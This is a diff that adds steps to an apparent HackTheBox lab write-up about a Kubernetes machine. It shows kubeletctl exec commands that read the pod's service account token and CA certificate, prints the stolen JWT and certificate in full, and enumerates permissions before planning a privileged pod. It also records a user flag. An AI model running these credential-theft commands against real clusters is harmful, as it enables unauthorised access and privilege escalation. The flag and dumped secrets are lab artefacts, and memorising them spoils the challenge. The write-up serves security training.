@@ -239,11 +239,123 @@ Nmap done: 1 IP address (1 host up) scanned in 105.87 seconds
 root
 ```
 
-14. Great! The exploit flow is different here. We can't just traverse directory here.
+> GETTING THE USER FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9582e4cc-bae7-462d-beb6-ffeb278a09f2)
+
+
+## USER FLAG
+
+```
+43df52debff39b99e488a3eb7fc41e26
+```
+
+14. To get the root flag, since we're exploiting kubernetes.
 15. We need to create our own service account. We can create higher privileged for our service account.
 
+> WHAT WE NEED --> token & ca.crt.
+
+```
+┌──(brandy㉿bread-yolk)-[~]
+└─$ kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
+eyJhbGciOiJSUzI1NiIsImtpZCI6IlVlZWxSZVRlYUFRTnVSa2JSb21McnBOdGVJMkpkWXN2U0ZHbFdJTmFQdEEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI1MzcyMTIyLCJpYXQiOjE2OTM4MzYxMjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImM5Y2Q4OGIwLTA3ZDYtNDk0Mi1hZjQxLTJkZjZlYzk3OGNmZCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjQ5ZTIwYzJjLTcyYjYtNDMzOC04NDkwLWNkNWYwMWEzMzJiMCJ9LCJ3YXJuYWZ0ZXIiOjE2OTM4Mzk3Mjl9LCJuYmYiOjE2OTM4MzYxMjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.L38Qi686kkEdsl_3U3Hq3VjDN5wVEnzAt21WWJ0cu1wQJer1Kuw90iAUIUoZj_7MbDMeSOm5KIBri92DLqM4B8YztmZLkEqK3sbyrAAOkKc9112wZCHjAe7Epc20QnCyAcQ7CYVHbpCj2V47WakFovKkE-HGUYx0MtARCTG9AMHW4AzbyzmVZGBeiaYQ4MM_u-sQIN6NKuqMsyOEF9S_0samWmtG5ONK39zooTdk-MY_HNye9H0pf3NE-PtLZ6pu7zGfI010Dj0htfZcvVFFnGjvGsH3PCnqW3qJUsac4I4tNkeF-w0r7-uqrXZS-ftkwCNZpnAi76sWH46KYxPw7Q                                                                                                                                                
+┌──(brandy㉿bread-yolk)-[~]
+└─$ kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
+-----BEGIN CERTIFICATE-----
+MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
+a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
+AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
+YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
+HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
+deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
+VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
+hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
+1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
+MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
+BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
+lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
+DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
+9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
+xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
+JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
+kf2eZIBNMp0TFg==
+-----END CERTIFICATE-----
+```
+
+16. Let's export the token to a variable and the ca cert to a file named .crt.
+
+```
+┌──(brandy㉿bread-yolk)-[~]
+└─$ export token="eyJhbGciOiJSUzI1NiIsImtpZCI6IlVlZWxSZVRlYUFRTnVSa2JSb21McnBOdGVJMkpkWXN2U0ZHbFdJTmFQdEEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI1MzcyMTIyLCJpYXQiOjE2OTM4MzYxMjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImM5Y2Q4OGIwLTA3ZDYtNDk0Mi1hZjQxLTJkZjZlYzk3OGNmZCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjQ5ZTIwYzJjLTcyYjYtNDMzOC04NDkwLWNkNWYwMWEzMzJiMCJ9LCJ3YXJuYWZ0ZXIiOjE2OTM4Mzk3Mjl9LCJuYmYiOjE2OTM4MzYxMjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.L38Qi686kkEdsl_3U3Hq3VjDN5wVEnzAt21WWJ0cu1wQJer1Kuw90iAUIUoZj_7MbDMeSOm5KIBri92DLqM4B8YztmZLkEqK3sbyrAAOkKc9112wZCHjAe7Epc20QnCyAcQ7CYVHbpCj2V47WakFovKkE-HGUYx0MtARCTG9AMHW4AzbyzmVZGBeiaYQ4MM_u-sQIN6NKuqMsyOEF9S_0samWmtG5ONK39zooTdk-MY_HNye9H0pf3NE-PtLZ6pu7zGfI010Dj0htfZcvVFFnGjvGsH3PCnqW3qJUsac4I4tNkeF-w0r7-uqrXZS-ftkwCNZpnAi76sWH46KYxPw7Q"
+```
+
+```
+┌──(brandy㉿bread-yolk)-[~]
+└─$ kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+-----BEGIN CERTIFICATE-----
+MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
+a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
+AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
+YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
+HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
+deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
+VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
+hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
+1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
+MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
+BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
+lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
+DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
+9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
+xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
+JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
+kf2eZIBNMp0TFg==
+-----END CERTIFICATE-----
+```
+
+> USING IT TO CHECK THE DEFAULT SERVICE ACCOUNT RIGHTS
+
+```
+┌──(brandy㉿bread-yolk)-[~]
+└─$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods                                 
+NAME    READY   STATUS    RESTARTS   AGE
+nginx   1/1     Running   0          93m
+```
+
+```
+┌──(brandy㉿bread-yolk)-[~]
+└─$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 auth can-i --list
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+pods                                            []                                    []               [get create list]
+                                                [/.well-known/openid-configuration]   []               [get]
+                                                [/api/*]                              []               [get]
+                                                [/api]                                []               [get]
+                                                [/apis/*]                             []               [get]
+                                                [/apis]                               []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/livez]                              []               [get]
+                                                [/livez]                              []               [get]
+                                                [/openapi/*]                          []               [get]
+                                                [/openapi]                            []               [get]
+                                                [/openid/v1/jwks]                     []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version]                            []               [get]
+                                                [/version]                            []               [get]
+```
 
 
+17. Based from the result, we know that we can create, get, and list pod in the default namespace.
+18. Knowing this let's make a custom pod that has higher privilege.
 
+> .yaml script
+
+```
+```
 
 
